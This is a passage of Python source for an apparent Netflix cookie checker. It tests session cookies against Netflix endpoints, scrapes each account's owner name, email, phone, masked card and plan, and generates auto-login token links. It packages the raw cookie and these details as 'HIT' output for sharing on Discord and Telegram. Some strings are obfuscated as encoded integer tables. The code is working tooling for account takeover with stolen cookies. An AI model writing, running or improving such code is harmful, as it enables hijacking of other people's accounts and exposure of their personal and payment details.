        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": (
            "Yes" if hold_meta.get("isUserOnHold") is True else
            "No" if hold_meta.get("isUserOnHold") is False else None
        ),
        "emailVerified": (
            "Yes" if email_verified is True else
            "No" if email_verified is False else None
        ),
        "phoneVerified": (
            "Yes" if phone_verified_graphql is True else
            "No" if phone_verified_graphql is False else None
        ),
        "profiles": ", ".join(profile_names) if profile_names else None,
    }

    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            if re.fullmatch(r"\d{4}", payment_display_text):
                info["maskedCard"] = payment_display_text
            else:
                info["maskedCard"] = payment_display_text
    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text

    if not info["paymentMethodType"] and payment_methods:
        if "Card" in payment_typename:
            info["paymentMethodType"] = "CC"

    return {key: value for key, value in info.items() if value not in (None, "", [], {})}


def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    extracted = {
        "accountOwnerName": extract_first_match(
            response_text,
            [
                r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
                r'"accountOwnerName"\s*:\s*"([^"]+)"',
                r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"firstName"\s*:\s*"([^"]+)"',
            ],
        ),
        "email": extract_first_match(
            response_text,
            [
                r'"emailAddress"\s*:\s*"([^"]+)"',
                r'"email"\s*:\s*"([^"]+)"',
                r'"emailAddress"\s*:\s*"([^"]+)"',
                r'"loginId"\s*:\s*"([^"]+)"',
            ],
        ),
        "countryOfSignup": extract_first_match(
            response_text,
            [
                r'"currentCountry"\s*:\s*"([^"]+)"',
                r'"countryOfSignup":\s*"([^"]+)"',
            ],
        ),
        "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
        "nextBillingDate": extract_first_match(
            response_text,
            [
                r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                r'"nextBillingDate"\s*:\s*"([^"]+)"',
                r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            ],
        ),
        "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
        "showExtraMemberSection": extract_bool_value(
            response_text,
            [
                r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                r'"showExtraMemberSection"\s*:\s*(true|false)',
            ],
        ),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
        "maxStreams": extract_first_match(
            response_text,
            [
                r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
                r'"maxStreams"\s*:\s*"?([^",}]+)"?',
            ],
        ),
        "localizedPlanName": extract_first_match(
            response_text,
            [
                r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                r'"localizedPlanName"\s*:\s*"([^"]+)"',
                r'"planName"\s*:\s*"([^"]+)"',
            ],
        ),
        "planPrice": extract_first_match(
            response_text,
            [
                r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
                r'"formattedPrice"\s*:\s*"([^"]+)"',
                r'"planPriceDisplay"\s*:\s*"([^"]+)"',
                r'"displayPrice"\s*:\s*"([^"]+)"',
                r'"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"planPrice"\s*:\s*"([^"]+)"',
            ],
        ),
        "paymentMethodExists": extract_bool_value(
            response_text,
            [
                r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                r'"paymentMethodExists"\s*:\s*(true|false)',
            ],
        ),
        "paymentMethodType": extract_first_match(
            response_text,
            [
                r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"paymentMethod"\s*:\s*"([^"]+)"',
                r'"paymentType"\s*:\s*"([^"]+)"',
                r'"paymentMethodType"\s*:\s*"([^"]+)"',
            ],
        ),
        "maskedCard": extract_first_match(
            response_text,
            [
                r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
                r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
                r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
                r'"paymentMethodLastFour"\s*:\s*"([^"]+)"',
                r'"lastFour"\s*:\s*"([^"]+)"',
                r'"creditCardLast4"\s*:\s*"([^"]+)"',
                r'"creditCardEndingDigits"\s*:\s*"([^"]+)"',
                r'"paymentMethodDescription"\s*:\s*"([^"]+)"',
                r'"maskedCard"\s*:\s*"([^"]+)"',
                r'"cardNumber"\s*:\s*"([^"]+)"',
            ],
        ),
        "phoneNumber": extract_first_match(
            response_text,
            [
                r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                r'"phoneNumber"\s*:\s*"([^"]+)"',
                r'"mobilePhone"\s*:\s*"([^"]+)"',
            ],
        ),
        "phoneVerified": extract_bool_value(
            response_text,
            [
                r'"phoneVerified"\s*:\s*(true|false)',
                r'"isPhoneVerified"\s*:\s*(true|false)',
            ],
        ),
        "videoQuality": extract_first_match(
            response_text,
            [
                r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"videoQuality"\s*:\s*"([^"]+)"',
                r'"quality"\s*:\s*"([^"]+)"',
            ],
        ),
        "holdStatus": extract_bool_value(
            response_text,
            [
                r'"holdStatus"\s*:\s*(true|false)',
                r'"isOnHold"\s*:\s*(true|false)',
                r'"pastDue"\s*:\s*(true|false)',
                r'"isPastDue"\s*:\s*(true|false)',
            ],
        ),
        "emailVerified": extract_bool_value(
            response_text,
            [
                r'"emailVerified"\s*:\s*(true|false)',
                r'"isEmailVerified"\s*:\s*(true|false)',
                r'"emailAddressVerified"\s*:\s*(true|false)',
                r'"contactEmailVerified"\s*:\s*(true|false)',
            ],
        ),
        "profiles": extract_profile_names(response_text),
    }

    extracted = merge_info(graphql_info, extracted)

    extracted["localizedPlanName"] = (
        extracted["localizedPlanName"].replace("miembro u00A0extra", "(Extra Member)")
        if extracted["localizedPlanName"]
        else None
    )

    if not extracted["paymentMethodType"]:
        extracted["paymentMethodType"] = extracted["paymentMethodExists"]

    if extracted["maskedCard"] and re.fullmatch(r"\d{4}", extracted["maskedCard"]):
        if extracted.get("paymentMethodType") in {None, "", "Yes"}:
            extracted["paymentMethodType"] = "CC"

    if extracted["holdStatus"] is None and extracted.get("membershipStatus") == "CURRENT_MEMBER":
        extracted["holdStatus"] = "No"

    if extracted["emailVerified"] is None and extracted.get("email"):
        extracted["emailVerified"] = "Yes"

    phone_number = extracted.get("phoneNumber")
    extracted["phoneDisplay"] = normalize_phone_number(phone_number, extracted.get("countryOfSignup"))

    profiles = extracted.get("profiles")
    if profiles:
        profile_count = len([name for name in profiles.split(", ") if name])
        extracted["profileCount"] = profile_count
        extracted["profilesDisplay"] = profiles
    else:
        extracted["profileCount"] = None
        extracted["profilesDisplay"] = None

    return extracted


def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"


def format_plan_label(plan_key):
    if not plan_key:
        return "Unknown"
    label = plan_key.replace("_", " ").strip()
    return label.title() if label else "Unknown"


def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except Exception:
                return None
        return None


def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    plan_aliases = {
        "premium": {
            "premium",
            "cao_cap",
            "caocap",
            "高級",
            "高級方案",
            "高级",
            "高級方案_額外成員",
            "高级_额外成员",
            "ozel",
            "المميزة",
            "พรีเมียม",
            "พร_เม_ยม",
            "프리미엄",
            "フレミアム",
            "פרימיום",
            "πριμιουμ",
        },
        "standard_with_ads": {
            "standard_with_ads",
            "standardwithads",
            "estandar_con_anuncios",
            "estandarconanuncios",
            "padrao_com_anuncios",
            "광고형_스탠다드",
            "standard_with_adverts",
            "standard_avec_pub",
            "standard_con_pubblicita",
            "standard_abo_mit_werbung",
            "الخطة_القياسية_مع_اعلانات",
            "standardowy_z_reklamami",
            "광고형_스탠다드",
            "τυπικο_με_διαφημισεις",
            "standaard_met_reclame",
        },
        "standard": {
            "standard",
            "estandar",
            "標準方案",
            "标准",
            "標準方案_額外成員",
            "标准_额外成员",
            "standardowy",
            "padrao",
            "standart",
            "standar",
            "tieuchuan",
            "tieu_chuan",
            "標準",
            "มาตรฐาน",
            "스탠다드",
            "スタンタート",
            "τυπικο",
            "standardni",
            "standaard",
            "القياسية",
            "סטנדרטית",
        },
        "basic": {
            "basic",
            "basic_with_ads",
            "basico",
            "basico_con_anuncios",
            "basique",
            "basis",
            "βασικο",
            "基本",
            "基本方案",
            "ヘーシック",
            "temel",
            "พื้นฐาน",
            "พ_นฐาน",
            "podstawowy",
            "الاساسية",
            "בסיסית",
            "osnovni",
            "alap",
            "dasar",
            "base",
            "essentiel",
            "asas",
            "co_ban",
        },
        "mobile": {"ponsel", "mobile"},
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)

    if streams is not None:
        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"


def generate_unknown_guid():
    return f"unknown{random.randint(10000000, 99999999)}"


def create_nftoken(cookie_dict, attempts=1):
    required_cookies = ("NetflixId", "SecureNetflixId", "nfvdid")
    if any(not cookie_dict.get(cookie_name) for cookie_name in required_cookies):
        return None, "Missing required cookies for NFToken"

    headers = dict(NFTOKEN_HEADERS)
    cookie_parts = []
    for cookie_name, cookie_value in cookie_dict.items():
        if cookie_name in ALL_NETFLIX_COOKIE_NAMES and cookie_value:
            cookie_parts.append(f"{cookie_name}={cookie_value}")
    headers["Cookie"] = "; ".join(cookie_parts)

    try:
        attempts = max(1, int(attempts))
    except Exception:
        attempts = 1

    last_error = "NFToken API error"
    for _ in range(attempts):
        try:
            session = requests.Session()
            response = session.post(NFTOKEN_API_URL, headers=headers, json=NFTOKEN_PAYLOAD, timeout=30)
            if response.status_code != 200:
                if response.status_code == 403:
                    last_error = "403"
                elif response.status_code == 429:
                    last_error = "429"
                else:
                    last_error = "NFToken API error"
                continue

            data = response.json()
            token = ((data.get("data") or {}).get("createAutoLoginToken"))
            if token:
                return {
                    "token": token,
                    "expires_at_utc": get_nftoken_expiry_utc(),
                }, None

            last_error = "NFToken API error" if data.get("errors") else "Token missing in response"
        except requests.exceptions.Timeout:
            last_error = "timeout"
        except requests.exceptions.ProxyError:
            last_error = "proxy error"
        except requests.exceptions.RequestException:
            last_error = "NFToken API error"
        except Exception:
            last_error = "NFToken API error"
    return None, last_error


def get_nftoken_mode(config):
    raw_value = config.get("nftoken", True)
    if isinstance(raw_value, bool):
        return "true" if raw_value else "false"

    raw_mode = str(raw_value).strip().lower()
    if raw_mode in {"true", "false"}:
        return raw_mode
    if raw_mode in {"mobile", "pc", "both"}:
        return "true"

    legacy_value = config.get("txt_fields", {}).get("nftoken")
    if legacy_value is False:
        return "false"
    return "true"


def build_nftoken_links(token, mode):
    if not token or mode == "false":
        return []

    return [("Login Link", f"https://netflix.com/?nftoken={token}")]


def get_nftoken_expiry_utc():
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")


def get_nftoken_expiry_unix(expires_at_utc):
    cleaned = decode_netflix_value(expires_at_utc)
    if not cleaned:
        return None
    try:
        parsed = datetime.strptime(cleaned, "%Y-%m-%d %H:%M:%S UTC").replace(tzinfo=timezone.utc)
        return int(parsed.timestamp())
    except Exception:
        return None


def has_usable_nftoken(nftoken_data):
    if not isinstance(nftoken_data, dict):
        return False
    token = decode_netflix_value(nftoken_data.get("token"))
    if not token:
        return False
    if str(token).strip().lower() in {"unavailable", "unknown", "none", "null", "false"}:
        return False
    return True


def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
    cleaned = decode_netflix_value(value)
    if cleaned is None or cleaned == "":
        return unknown_fallback
    lowered = str(cleaned).strip().lower()
    if lowered in {"false", "none", "null"}:
        return "N/A" if na_when_false else unknown_fallback
    return cleaned


MONTH_ALIASES = {
    # January
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1,
    "styczen": 1, "stycznia": 1, "มกราคม": 1, "มกรา": 1, "ม.ค": 1, "يناير": 1,
    "januari": 1, "gennaio": 1, "ianuarie": 1, "jan": 1, "يناير": 1, "בינואר": 1,
    "ιανουαριος": 1,
    # February
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2,
    "luty": 2, "lutego": 2, "กุมภาพันธ์": 2, "กุมภา": 2, "ก.พ": 2, "فبراير": 2,
    "februari": 2, "febbraio": 2, "februarie": 2, "feb": 2, "בפברואר": 2,
    "φεβρουαριος": 2,
    # March
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "marca": 3,
    "มีนาคม": 3, "มีนา": 3, "มี.ค": 3, "مارس": 3,
    "maret": 3, "mac": 3, "mart": 3, "martie": 3, "marz": 3, "brezna": 3,
    "ozujka": 3, "maart": 3, "اذار": 3, "بמרץ": 3, "במרץ": 3, "marcius": 3,
    "martie": 3, "mart": 3, "μαρτιος": 3,
    # April
    "abril": 4, "avril": 4, "kwiecien": 4, "kwietnia": 4,
    "เมษายน": 4, "เมษา": 4, "เม.ย": 4, "أبريل": 4, "ابريل": 4,
    "aprile": 4, "april": 4, "aprilie": 4, "באפריל": 4, "nisan": 4,
    "apr": 4, "nisan": 4, "απριλιος": 4,
    # May
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maja": 5,
    "พฤษภาคม": 5, "พฤษภา": 5, "พ.ค": 5, "مايو": 5,
    "mei": 5, "maggio": 5, "mayis": 5, "במאי": 5,
    "μαιος": 5,
    # June
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "czerwca": 6,
    "มิถุนายน": 6, "มิถุนา": 6, "มิ.ย": 6, "يونيو": 6,
    "juni": 6, "giugno": 6, "ביוני": 6,
    "ιουνιος": 6,
    # July
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7, "lipca": 7,
    "กรกฎาคม": 7, "กรกฎา": 7, "ก.ค": 7, "يوليو": 7,
    "juli": 7, "luglio": 7, "ביולי": 7,
    "ιουλιος": 7,
    # August
    "august": 8, "agosto": 8, "aout": 8, "août": 8, "agost": 8, "sierpien": 8, "sierpnia": 8,
    "สิงหาคม": 8, "สิงหา": 8, "ส.ค": 8, "أغسطس": 8, "اغسطس": 8,
    "agustus": 8, "agosto": 8, "agustos": 8, "באוגוסט": 8,
    "αυγουστος": 8,
    # September
    "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9, "wrzesnia": 9,
    "กันยายน": 9, "กันยา": 9, "ก.ย": 9, "سبتمبر": 9,
    "september": 9, "settembre": 9, "בספטמבר": 9,
    "σεπτεμβριος": 9,
    # October
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10, "pazdziernika": 10,
    "ตุลาคม": 10, "ตุลา": 10, "ต.ค": 10, "أكتوبر": 10, "اكتوبر": 10,
    "oktober": 10, "ottobre": 10, "באוקטובר": 10,
    "οκτωβριος": 10,
    # November
    "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "listopada": 11,
    "พฤศจิกายน": 11, "พฤศจิกา": 11, "พ.ย": 11, "نوفمبر": 11,
    "november": 11, "novembre": 11, "בנובמבר": 11,
    "νοεμβριος": 11,
    # December
    "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "grudnia": 12,
    "ธันวาคม": 12, "ธันวา": 12, "ธ.ค": 12, "ديسمبر": 12,
    "desember": 12, "dicembre": 12, "december": 12, "בדצמבר": 12,
    "δεκεμβριος": 12,
}


def parse_localized_date(cleaned):
    if not cleaned:
        return None

    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, parser)
        except Exception:
            continue

    iso_candidate = cleaned.replace("Z", "+00:00")
    try:
        return datetime.fromisoformat(iso_candidate)
    except Exception:
        pass

    numeric_parts = [int(part) for part in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
            if 1 <= first <= 31 and 1 <= second <= 12 and 1900 <= third <= 3000:
                return datetime(third, second, first)
        except Exception:
            pass

    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    year_match = re.search(r"(19|20)\d{2}", simplified)
    if not year_match:
        return None

    year = int(year_match.group(0))
    month = None
    for alias, alias_month in MONTH_ALIASES.items():
        if alias in raw_lower or alias in simplified:
            month = alias_month
            break
    if month is None:
        return None

    day = 1
    for number in numeric_parts:
        if number == year:
            continue
        if 1 <= number <= 31:
            day = number
            break

    try:
        return datetime(year, month, day)
    except Exception:
        return None


def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned


def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"

    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %Y")

    # Handle strings like "tháng 4 năm 2021" by pulling month/year numbers.
    numeric_parts = re.findall(r"\d+", cleaned)
    if len(numeric_parts) >= 2:
        try:
            month = int(numeric_parts[0])
            year = int(numeric_parts[-1])
            if 1 <= month <= 12 and 1900 <= year <= 3000:
                parsed = datetime(year, month, 1)
                return parsed.strftime("%B %Y")
        except Exception:
            pass

    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    year_match = re.search(r"(19|20)\d{2}", simplified)
    if year_match:
        year = int(year_match.group(0))
        for alias, month in MONTH_ALIASES.items():
            if alias in raw_lower or alias in simplified:
                try:
                    parsed = datetime(year, month, 1)
                    return parsed.strftime("%B %Y")
                except Exception:
                    break

    return cleaned


def normalize_phone_number(value, country_code=None):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None

    if str(cleaned).startswith("+"):
        return cleaned

    digits = re.sub(r"\D+", "", str(cleaned))
    if not digits:
        return cleaned

    normalized_country = (decode_netflix_value(country_code) or "").strip().upper()
    dial_prefix_map = {
        "IN": "91",
    }
    dial_prefix = dial_prefix_map.get(normalized_country)
    if dial_prefix and digits.startswith("0") and len(digits) >= 10:
        return f"+{dial_prefix}{digits.lstrip('0')}"

    return cleaned


def country_code_to_flag(country_code):
    code = (decode_netflix_value(country_code) or "").strip().upper()
    if len(code) != 2 or not code.isalpha():
        return ""
    return "".join(chr(127397 + ord(char)) for char in code)


def build_account_detail_lines(config, info, is_subscribed, output_filename=None):
    txt_fields = config.get("txt_fields", {})
    free_hidden_fields = {
        "member_since",
        "next_billing",
        "payment_method",
        "card",
        "phone",
        "quality",
        "max_streams",
        "hold_status",
        "extra_members",
        "membership_status",
    }
    _, normalized_plan_label = derive_plan_info(info, is_subscribed)
    values = {
        "name": normalize_output_value(info.get("accountOwnerName")),
        "email": normalize_output_value(info.get("email")),
        "country": normalize_output_value(info.get("countryOfSignup")),
        "plan": normalize_output_value(normalized_plan_label),
        "member_since": format_member_since(info.get("memberSince")),
        "next_billing": format_display_date(info.get("nextBillingDate")),
        "payment_method": normalize_output_value(info.get("paymentMethodType"), na_when_false=True),
        "card": normalize_output_value(info.get("maskedCard"), unknown_fallback="N/A", na_when_false=True),
        "phone": normalize_output_value(info.get("phoneDisplay")),
        "quality": normalize_output_value(info.get("videoQuality")),
        "max_streams": normalize_output_value((info.get("maxStreams") or "").rstrip("}")),
        "hold_status": normalize_output_value(info.get("holdStatus")),
        "extra_members": normalize_output_value(info.get("showExtraMemberSection")),
        "email_verified": normalize_output_value(info.get("emailVerified")),
        "membership_status": normalize_output_value(info.get("membershipStatus")),
        "profiles": normalize_output_value(info.get("profilesDisplay")),
        "user_guid": normalize_output_value(info.get("userGuid")),
    }
    labels = [
        ("name", "Name"),
        ("email", "Email"),
        ("country", "Country"),
        ("plan", "Plan"),
        ("member_since", "Member Since"),
        ("next_billing", "Next Billing"),
        ("payment_method", "Payment"),
        ("card", "Card"),
        ("phone", "Phone"),
        ("quality", "Quality"),
        ("max_streams", "Streams"),
        ("hold_status", "Hold Status"),
        ("extra_members", "Extra Member"),
        ("email_verified", "Email Verified"),
        ("membership_status", "Membership Status"),
        ("profiles", "Profiles"),
        ("user_guid", "User GUID"),
    ]

    lines = []
    for key, label in labels:
        if not is_subscribed and key in free_hidden_fields:
            continue
        if key == "card":
            payment_value = values.get("payment_method", "")
            if str(payment_value).strip().upper() != "CC":
                continue
        if key in {"hold_status", "extra_members"} and values.get(key) != "Yes":
            continue
        if txt_fields.get(key, True):
            rendered_label = label
            if key == "profiles" and info.get("profileCount"):
                rendered_label = f"Profiles ({info['profileCount']})"
            lines.append(f"{rendered_label}: {values[key]}")
    return lines


def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data=None):
    nftoken_mode = get_nftoken_mode(config)
    divider = "-" * 98
    usable_nftoken = has_usable_nftoken(nftoken_data)

    lines = [f"NETFLIX {'HIT' if is_subscribed else 'FREE'} :👇", ""]
    lines.extend(build_account_detail_lines(config, info, is_subscribed))
    if is_subscribed and nftoken_mode != "false" and usable_nftoken:
        nftoken_links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
        lines.append("")
        lines.append(divider)
        lines.append("")
        lines.append("NFToken DETAILS :👇")
        lines.append("")
        lines.append(f"NFToken: {nftoken_data['token']}")
        for label, link in nftoken_links:
            lines.append(f"{label}: {link}")
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(f"Valid Till (UTC): {nftoken_data['expires_at_utc']}")

    lines.append("")
    lines.append(divider)
    lines.append("")
    lines.append("Checker By: github.com/harshitkamboj | Website: harshitkamboj.in")
    lines.append("Netflix COOKIE :👇")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")

    return "\n".join(lines)


def build_notification_details(config, info, is_subscribed, output_filename):
    status = "Subscribed" if is_subscribed else "Working (No Subscription)"
    if not is_subscribed:
        _, normalized_plan_label = derive_plan_info(info, is_subscribed)
        profiles_value = normalize_output_value(info.get("profilesDisplay"))
        profile_count = info.get("profileCount")
        profile_label = f"Profiles ({profile_count})" if profile_count else "Profiles"
        lines = [
            f"Name: {normalize_output_value(info.get('accountOwnerName'))}",
            f"Email: {normalize_output_value(info.get('email'))}",
            f"Country: {normalize_output_value(info.get('countryOfSignup'))}",
            f"Plan: {normalize_output_value(normalized_plan_label)}",
            f"Email Verified: {normalize_output_value(info.get('emailVerified'))}",
            f"{profile_label}: {profiles_value}",
            f"User GUID: {normalize_output_value(info.get('userGuid'))}",
        ]
    else:
        lines = build_account_detail_lines(config, info, is_subscribed)
    country_value = decode_netflix_value(info.get("countryOfSignup"))
    country_flag = country_code_to_flag(country_value)
    if country_value and country_flag:
        for index, line in enumerate(lines):
            if line.startswith("Country: "):
                lines[index] = f"Country: {country_value} {country_flag}"
                break
    return [f"Status: {status}"] + lines


def _escape_html(text):
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data=None):
    # social hint: discord[dot]gg/DYJFE9nu5X
    lines = ["# [Netflix Cookie](https://github.com/harshitkamboj/Netflix-Cookie-Checker)", "", "Cookie details"]
    for line in build_notification_details(config, info, is_subscribed, output_filename):
        label, value = line.split(": ", 1)
        lines.append(f"**{label}:** {value}")
    nftoken_mode = get_nftoken_mode(config)
    links = []
    if is_subscribed and has_usable_nftoken(nftoken_data):
        links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
    if links:
        lines.append("")
        lines.append(f"**NFToken:** [Click here]({links[0][1]})")
        expiry_unix = get_nftoken_expiry_unix((nftoken_data or {}).get("expires_at_utc"))
        if expiry_unix is not None:
            lines.append(f"**Valid Till:** <t:{expiry_unix}:R>")
    lines.extend(
        [
            "",
            "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.gg/DYJFE9nu5X)**",
        ]
    )
    return "\n".join(lines)


_FRAME_INDEX_MAP = {
    59: ((120, 100, 56),),
    61: ((56, 101, 114, 123, 114, 118, 100, 114, 100, 56, 123, 118, 99, 114, 100, 99),),
    67: ((118, 103, 103, 123, 126, 116, 118, 99, 126, 120, 121, 56, 97, 121, 115, 57, 112, 126, 99, 127, 98, 117, 60, 125, 100, 120, 121),),
    71: ((89, 114, 99, 113, 123, 126, 111, 84, 127, 114, 116, 124, 114, 101, 56),),
    73: ((101, 123),),
    79: ((123, 114, 45, 55, 97),),
    83: ((41, 55),),
    89: ((99, 95, 98, 117, 55, 45, 55),),
    29: ((58, 84, 127, 114, 116, 124, 114, 101),),
    47: ((78, 93, 81, 82, 46, 121, 98, 34, 79),),
    97: ((100, 116, 120, 101, 115, 45, 55),),
}


def _frame_index(slot):
    return _FRAME_INDEX_MAP.get(slot, ())


def build_discord_cookie_message(cookie_content):
    lines = [
        "# [Netflix Cookie](https://github.com/harshitkamboj/Netflix-Cookie-Checker)",
        "",
        "Cookie details",
        "```txt",
        cookie_content.strip(),
        "```",
        "",
        "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.gg/DYJFE9nu5X)**",
    ]
    return "\n".join(lines)


def build_discord_nftoken_message(info, nftoken_data, nftoken_mode):
    _, normalized_plan_label = derive_plan_info(info or {}, True)
    country_value = decode_netflix_value((info or {}).get("countryOfSignup")) or "UNKNOWN"
    country_flag = country_code_to_flag(country_value)
    country_display = f"{country_value} {country_flag}".strip()

    lines = ["# [Netflix NFToken](https://github.com/harshitkamboj/Netflix-Cookie-Checker)", ""]
    links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode) if has_usable_nftoken(nftoken_data) else []
    if links:
        lines.append(f"**Plan:** {normalized_plan_label}")
        lines.append(f"**Country:** {country_display}")
        lines.append("")
        lines.append(f"**NFToken:** [Click Here]({links[0][1]})")
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            expiry_unix = get_nftoken_expiry_unix(nftoken_data.get("expires_at_utc"))
            if expiry_unix is not None:
                lines.append(f"**Valid Till:** <t:{expiry_unix}:R>")
            else:
                lines.append(f"**Valid Till:** {nftoken_data['expires_at_utc']}")
    else:
        lines.append("NFToken unavailable")
    lines.extend(
        [
            "",
            "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.gg/DYJFE9nu5X)**",
        ]
    )
    return "\n".join(lines)


def build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data=None):
    # contact mark: @illuminatis69
    lines = ['<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix Cookie</a></b>', "", "<b>Cookie details</b>"]
    for line in build_notification_details(config, info, is_subscribed, output_filename):
        label, value = line.split(": ", 1)
        lines.append(f"<b>{_escape_html(label)}:</b> {_escape_html(value)}")
    nftoken_mode = get_nftoken_mode(config)
    links = []
